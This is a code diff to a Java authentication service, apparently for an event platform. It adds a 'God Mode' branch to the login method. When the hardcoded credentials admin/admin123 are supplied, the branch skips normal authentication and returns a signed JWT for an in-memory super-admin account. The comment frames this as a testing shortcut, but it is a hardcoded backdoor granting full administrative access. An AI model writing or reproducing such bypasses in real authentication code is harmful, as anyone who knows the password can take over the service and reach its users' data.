@@ -26,6 +26,36 @@ public class AuthService {
     private final AuthenticationManager authenticationManager;
 
     public AuthResponse login(AuthRequest request) {
+
+        // God Mode: Direct access for quick testing/admin purposes
+        if ("admin".equals(request.getUsernameOrEmail()) && "admin123".equals(request.getPassword())) {
+
+            User adminUser = User.builder()
+                    .id("super-admin-god-mode")
+                    .username("admin")
+                    .email("admin@event.com")
+                    .password(passwordEncoder.encode("admin123")) // Dummy encoded password
+                    .role(Roles.SUPER_ADMIN)
+                    .firstName("Super")
+                    .lastName("Admin")
+                    .enabled(true)
+                    .createdAt(Instant.now())
+                    .build();
+
+            String jwtToken = jwtService.generateToken(adminUser);
+
+            return AuthResponse.builder()
+                    .token(jwtToken)
+                    .id(adminUser.getId())
+                    .username(adminUser.getUsername())
+                    .email(adminUser.getEmail())
+                    .firstName(adminUser.getFirstName())
+                    .lastName(adminUser.getLastName())
+                    .role(adminUser.getRole().name())
+                    .organizationId(null)
+                    .build();
+        }
+
         authenticationManager.authenticate(
                 new UsernamePasswordAuthenticationToken(
                         request.getUsernameOrEmail(),
